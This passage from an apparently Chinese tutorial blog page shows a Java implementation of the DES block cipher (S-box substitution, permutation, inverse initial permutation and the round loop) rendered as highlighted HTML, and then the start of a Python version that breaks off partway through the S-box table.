class="number">6</span>, <span class="number">12</span>, <span class="number">11</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">8</span>,</span><br><span class="line">                <span class="number">4</span>, <span class="number">1</span>, <span class="number">14</span>, <span class="number">8</span>, <span class="number">13</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">11</span>, <span class="number">15</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">7</span>, <span class="number">3</span>, <span class="number">10</span>, <span class="number">5</span>, <span class="number">0</span>,</span><br><span class="line">                <span class="number">15</span>, <span class="number">12</span>, <span class="number">8</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">11</span>, <span class="number">3</span>, <span class="number">14</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">13</span>&#125;,</span><br><span class="line">                &#123;<span class="number">15</span>, <span class="number">1</span>, <span class="number">8</span>, <span class="number">14</span>, <span class="number">6</span>, <span class="number">11</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">13</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">10</span>,</span><br><span class="line">                <span class="number">3</span>, <span class="number">13</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">15</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">14</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">11</span>, <span class="number">5</span>,</span><br><span class="line">                <span class="number">0</span>, <span class="number">14</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">10</span>, <span class="number">4</span>, <span class="number">13</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">12</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">15</span>,</span><br><span class="line">                <span class="number">13</span>, <span class="number">8</span>, <span class="number">10</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">15</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">11</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">14</span>, <span class="number">9</span>&#125;,</span><br><span class="line">                &#123;<span class="number">10</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">14</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">15</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">13</span>, <span class="number">12</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">8</span>,</span><br><span class="line">                <span class="number">13</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">14</span>, <span class="number">12</span>, <span class="number">11</span>, <span class="number">15</span>, <span class="number">1</span>,</span><br><span class="line">                <span class="number">13</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">15</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">12</span>, <span class="number">5</span>, <span class="number">10</span>, <span class="number">14</span>, <span class="number">7</span>,</span><br><span class="line">                <span class="number">1</span>, <span class="number">10</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">15</span>, <span class="number">14</span>, <span class="number">3</span>, <span class="number">11</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">12</span>&#125;,</span><br><span class="line">                &#123;<span class="number">7</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">15</span>,</span><br><span class="line">                <span class="number">13</span>, <span class="number">8</span>, <span class="number">11</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">12</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">14</span>, <span class="number">9</span>,</span><br><span class="line">                <span class="number">10</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">11</span>, <span class="number">7</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">14</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">4</span>,</span><br><span class="line">                <span class="number">3</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">1</span>, <span class="number">13</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">14</span>&#125;,</span><br><span class="line">                &#123;<span class="number">2</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">15</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">9</span>,</span><br><span class="line">                <span class="number">14</span>, <span class="number">11</span>, <span class="number">2</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">13</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">10</span>, <span class="number">3</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">6</span>,</span><br><span class="line">                <span class="number">4</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">11</span>, <span class="number">10</span>, <span class="number">13</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">15</span>, <span class="number">9</span>, <span class="number">12</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">14</span>,</span><br><span class="line">                <span class="number">11</span>, <span class="number">8</span>, <span class="number">12</span>, <span class="number">7</span>, <span class="number">1</span>, <span class="number">14</span>, <span class="number">2</span>, <span class="number">13</span>, <span class="number">6</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">3</span>&#125;,</span><br><span class="line">                &#123;<span class="number">12</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">9</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">13</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">14</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">11</span>,</span><br><span class="line">                <span class="number">10</span>, <span class="number">15</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">3</span>, <span class="number">8</span>,</span><br><span class="line">                <span class="number">9</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">12</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">10</span>, <span class="number">1</span>, <span class="number">13</span>, <span class="number">11</span>, <span class="number">6</span>,</span><br><span class="line">                <span class="number">4</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">15</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">14</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">13</span>&#125;,</span><br><span class="line">                &#123;<span class="number">4</span>, <span class="number">11</span>, <span class="number">2</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">13</span>, <span class="number">3</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">10</span>, <span class="number">6</span>, <span class="number">1</span>,</span><br><span class="line">                <span class="number">13</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">14</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">12</span>, <span class="number">2</span>, <span class="number">15</span>, <span class="number">8</span>, <span class="number">6</span>,</span><br><span class="line">                <span class="number">1</span>, <span class="number">4</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">12</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">14</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">2</span>,</span><br><span class="line">                <span class="number">6</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">8</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">10</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">14</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">12</span>&#125;,</span><br><span class="line">                &#123;<span class="number">13</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">15</span>, <span class="number">11</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">9</span>, <span class="number">3</span>, <span class="number">14</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">7</span>,</span><br><span class="line">                <span class="number">1</span>, <span class="number">15</span>, <span class="number">13</span>, <span class="number">8</span>, <span class="number">10</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">12</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">11</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">9</span>, <span class="number">2</span>,</span><br><span class="line">                <span class="number">7</span>, <span class="number">11</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">9</span>, <span class="number">12</span>, <span class="number">14</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">8</span>,</span><br><span class="line">                <span class="number">2</span>, <span class="number">1</span>, <span class="number">14</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">10</span>, <span class="number">8</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">11</span>&#125;&#125;;</span><br><span class="line">        String retstr = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">while</span> (S_Input.length()&lt;<span class="number">48</span>)&#123;</span><br><span class="line">            S_Input = <span class="string">"0"</span> + S_Input;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> index = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">8</span>;i++)&#123;</span><br><span class="line">            <span class="keyword">int</span>[] Slist = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">64</span>];</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>;j &lt; <span class="number">64</span>;j++)&#123;</span><br><span class="line">                Slist[j] = STABLE[i][j];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">int</span> row = (S_Input.charAt(index)-<span class="string">'0'</span>)*<span class="number">2</span>+(S_Input.charAt(index+<span class="number">5</span>)-<span class="string">'0'</span>);</span><br><span class="line">            <span class="keyword">int</span> col = (S_Input.charAt(index+<span class="number">1</span>)-<span class="string">'0'</span>)*<span class="number">8</span> + (S_Input.charAt(index+<span class="number">2</span>)-<span class="string">'0'</span>)*<span class="number">4</span>+(S_Input.charAt(index+<span class="number">3</span>)-<span class="string">'0'</span>)*<span class="number">2</span>+(S_Input.charAt(index+<span class="number">4</span>)-<span class="string">'0'</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            String ret_single = Integer.toBinaryString(Slist[row*<span class="number">16</span>+col]);</span><br><span class="line">            <span class="keyword">while</span> (ret_single.length() &lt; <span class="number">4</span>)&#123;</span><br><span class="line">                ret_single = <span class="string">"0"</span> + ret_single;</span><br><span class="line">            &#125;</span><br><span class="line">            retstr += ret_single;</span><br><span class="line">            index += <span class="number">6</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (retstr.length() != <span class="number">32</span>)&#123;</span><br><span class="line">            System.out.println(<span class="string">"Your S_sub retstr lenth is erroe!\n"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> retstr;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String[] P(String Ln,String S_sub_str,String Rn)&#123;</span><br><span class="line">        <span class="keyword">int</span>[] PTABLE = &#123;<span class="number">16</span>, <span class="number">7</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">29</span>, <span class="number">12</span>, <span class="number">28</span>, <span class="number">17</span>, <span class="number">1</span>, <span class="number">15</span>, <span class="number">23</span>, <span class="number">26</span>, <span class="number">5</span>, <span class="number">18</span>, <span class="number">31</span>, <span class="number">10</span>,</span><br><span class="line">                <span class="number">2</span>, <span class="number">8</span>, <span class="number">24</span>, <span class="number">14</span>, <span class="number">32</span>, <span class="number">27</span>, <span class="number">3</span>, <span class="number">9</span>, <span class="number">19</span>, <span class="number">13</span>, <span class="number">30</span>, <span class="number">6</span>, <span class="number">22</span>, <span class="number">11</span>, <span class="number">4</span>, <span class="number">25</span>&#125;;</span><br><span class="line">        String tmp = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; PTABLE.length;i++)&#123;</span><br><span class="line">            tmp += S_sub_str.charAt(PTABLE[i]-<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        String Lnnew = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; tmp.length();i++)&#123;</span><br><span class="line">            Lnnew += (tmp.charAt(i) - <span class="string">'0'</span>) ^ (Ln.charAt(i) - <span class="string">'0'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (Lnnew.length()&lt;<span class="number">32</span>)&#123;</span><br><span class="line">            Lnnew = <span class="string">"0"</span> + Lnnew;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (Lnnew.length()!=<span class="number">32</span>)&#123;</span><br><span class="line">            System.out.println(<span class="string">"Your Lnnew lenth is error!\n"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        Ln = Rn;</span><br><span class="line">        Rn = Lnnew;</span><br><span class="line">        String[] strstr = <span class="keyword">new</span> String[<span class="number">2</span>];</span><br><span class="line">        strstr[<span class="number">0</span>] = Ln;</span><br><span class="line">        strstr[<span class="number">1</span>] = Rn;</span><br><span class="line">        <span class="keyword">return</span>  strstr;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">IP_inverse</span><span class="params">(String L16,String R16)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span>[] IPINVERSETABLE = &#123;<span class="number">40</span>, <span class="number">8</span>, <span class="number">48</span>, <span class="number">16</span>, <span class="number">56</span>, <span class="number">24</span>, <span class="number">64</span>, <span class="number">32</span>, <span class="number">39</span>, <span class="number">7</span>, <span class="number">47</span>, <span class="number">15</span>, <span class="number">55</span>, <span class="number">23</span>, <span class="number">63</span>, <span class="number">31</span>,</span><br><span class="line">                <span class="number">38</span>, <span class="number">6</span>, <span class="number">46</span>, <span class="number">14</span>, <span class="number">54</span>, <span class="number">22</span>, <span class="number">62</span>, <span class="number">30</span>, <span class="number">37</span>, <span class="number">5</span>, <span class="number">45</span>, <span class="number">13</span>, <span class="number">53</span>, <span class="number">21</span>, <span class="number">61</span>, <span class="number">29</span>,</span><br><span class="line">                <span class="number">36</span>, <span class="number">4</span>, <span class="number">44</span>, <span class="number">12</span>, <span class="number">52</span>, <span class="number">20</span>, <span class="number">60</span>, <span class="number">28</span>, <span class="number">35</span>, <span class="number">3</span>, <span class="number">43</span>, <span class="number">11</span>, <span class="number">51</span>, <span class="number">19</span>, <span class="number">59</span>, <span class="number">27</span>,</span><br><span class="line">                <span class="number">34</span>, <span class="number">2</span>, <span class="number">42</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">18</span>, <span class="number">58</span>, <span class="number">26</span>, <span class="number">33</span>, <span class="number">1</span>, <span class="number">41</span>, <span class="number">9</span>, <span class="number">49</span>, <span class="number">17</span>, <span class="number">57</span>, <span class="number">25</span>&#125;;</span><br><span class="line">        String tmp = L16 + R16;</span><br><span class="line">        String retstr = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; IPINVERSETABLE.length;i++)&#123;</span><br><span class="line">            retstr += tmp.charAt(IPINVERSETABLE[i] - <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (retstr.length() != <span class="number">64</span>)&#123;</span><br><span class="line">            System.out.println(<span class="string">"Your IP_inverse is error!\n"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> retstr;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Main</span><span class="params">()</span></span>&#123;</span><br><span class="line">        Scanner scan = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        ClearTxt = scan.next();</span><br><span class="line">        HextoBin hexto = <span class="keyword">new</span> HextoBin();</span><br><span class="line">        hexto.set(ClearTxt);</span><br><span class="line">        String str2 = hexto.out();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">64</span>;i++)&#123;</span><br><span class="line">            BinaryClearTxt[i] = str2.charAt(i)-<span class="string">'0'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        BinaryClearTxt = IP(BinaryClearTxt);</span><br><span class="line">        <span class="keyword">int</span>[] tmpLn = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">32</span>];</span><br><span class="line">        <span class="keyword">int</span>[] tmpRn = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">32</span>];</span><br><span class="line">        String Ln = <span class="string">""</span>;</span><br><span class="line">        String Rn = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt;<span class="number">32</span>;i++)&#123;</span><br><span class="line">            Ln += BinaryClearTxt[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">32</span>;i &lt;<span class="number">64</span>;i++)&#123;</span><br><span class="line">            Rn += BinaryClearTxt[i];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Key Key = <span class="keyword">new</span> Key();</span><br><span class="line">        Key.set();</span><br><span class="line"></span><br><span class="line">        Sonkey = Key.Main();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt;<span class="number">16</span>;i++)&#123;</span><br><span class="line">            <span class="keyword">int</span>[] tmpkey = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">48</span>];</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>;j &lt; <span class="number">48</span>;j++)&#123;</span><br><span class="line">                tmpkey[j] = Sonkey[i][j];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span> (Rn.length() &lt; <span class="number">32</span>)&#123;</span><br><span class="line">                Rn = <span class="string">"0"</span> + Rn;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span> (Ln.length() &lt; <span class="number">32</span>)&#123;</span><br><span class="line">                Ln = <span class="string">"0"</span> + Ln;</span><br><span class="line">            &#125;</span><br><span class="line">            String Rn_expand = expend(Rn);</span><br><span class="line">            String S_input = <span class="string">""</span>;</span><br><span class="line">            String S_sub_str = <span class="string">""</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j =<span class="number">0</span>;j&lt;<span class="number">48</span>;j++)&#123;</span><br><span class="line">                S_input += ((Rn_expand.charAt(j) - <span class="string">'0'</span>) ^ (tmpkey[j]));</span><br><span class="line">            &#125;</span><br><span class="line">            S_sub_str = S_sub(S_input);</span><br><span class="line">            String[] StrStr = <span class="keyword">new</span> String[<span class="number">2</span>];</span><br><span class="line">            StrStr = P(Ln,S_sub_str,Rn);</span><br><span class="line">            Ln = StrStr[<span class="number">0</span>];</span><br><span class="line">            Rn = StrStr[<span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        String tmpp = <span class="string">""</span>;</span><br><span class="line">        tmpp = Ln;</span><br><span class="line">        Ln = Rn;</span><br><span class="line">        Rn = tmpp;</span><br><span class="line">        String re_text = IP_inverse(Ln,Rn);</span><br><span class="line">        <span class="keyword">int</span> tmnum = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> tmindex = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> tmmindex = <span class="number">3</span>;</span><br><span class="line">        String a = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i =<span class="number">0</span>;i &lt;<span class="number">64</span>;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(tmindex == <span class="number">4</span>)&#123;</span><br><span class="line">                tmindex = <span class="number">0</span>;</span><br><span class="line">                a += hexStr.charAt(tmnum);</span><br><span class="line">                tmnum = <span class="number">0</span>;</span><br><span class="line">                tmmindex = <span class="number">3</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            tmnum += Math.pow(<span class="number">2</span>,tmmindex) * (re_text.charAt(i) - <span class="string">'0'</span>);</span><br><span class="line">            tmmindex --;</span><br><span class="line">            tmindex ++;</span><br><span class="line">            <span class="keyword">if</span>(i == <span class="number">63</span>)&#123;</span><br><span class="line">                a += hexStr.charAt(tmnum);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">"Your DES Result is : "</span>+re_text);</span><br><span class="line">        System.out.println(<span class="string">"Your DES Result is : "</span>+tmnum);</span><br><span class="line">        System.out.println(<span class="string">"Your DES Result is : "</span>+a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Python实现</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">expend</span><span class="params">(Rn)</span>:</span></span><br><span class="line">    ETABLE = [<span class="number">32</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>,</span><br><span class="line">                <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>,</span><br><span class="line">                <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>,</span><br><span class="line">                <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">17</span>,</span><br><span class="line">                <span class="number">16</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">21</span>,</span><br><span class="line">                <span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">25</span>,</span><br><span class="line">                <span class="number">24</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">28</span>, <span class="number">29</span>,</span><br><span class="line">                <span class="number">28</span>, <span class="number">29</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">32</span>, <span class="number">1</span>]</span><br><span class="line">    retRn = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> ETABLE:</span><br><span class="line">        retRn += Rn[i - <span class="number">1</span>]</span><br><span class="line">    <span class="keyword">assert</span> len(retRn) == <span class="number">48</span></span><br><span class="line">    <span class="keyword">return</span> retRn</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">S_sub</span><span class="params">(S_Input)</span>:</span></span><br><span class="line">    STABLE = [(<span class="number">14</span>, <span class="number">4</span>, <span class="number">13</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">15</span>, <span class="number">11</span>, <span class="number">8</span>, <span class="number">3</span>, <span class="number">10</span>, <span class="number">6</span>, <span class="number">12</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">7</span>,</span><br><span class="line">                 <span class="number">0</span>, <span class="number">15</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">14</span>, <span class="number">2</span>, <span class="number">13</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">6</span>, <span class="number">12</span>, <span class="number">11</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">8</span>,</span><br><span class="line">                 <span class="number">4</span>, <span class="number">1</span>, <span class="number">14</span>, <span class="number">8</span>, <span class="number">13</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">11</span>, <span class="number">15</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">7</span>, <span class="number">3</span>, <span class="number">10</span>, <span class="number">5</span>, <span class="number">0</span>,</span><br><span class="line">                 <span class="number">15</span>, <span class="number">12</span>, <span class="number">8</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">11</span>, <span class="number">3</span>, <span class="number">14</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">13</span>),</span><br><span class="line">                (<span class="number">15</span>, <span class="number">1</span>, <span class="number">8</span>, <span class="number">14</span>, <span class="number">6</span>, <span class="number">11</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">13</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">10</span>,</span><br><span class="line">                 <span class="number">3</span>, <span class="number">13</span>, <span class="number">4</span>, <span 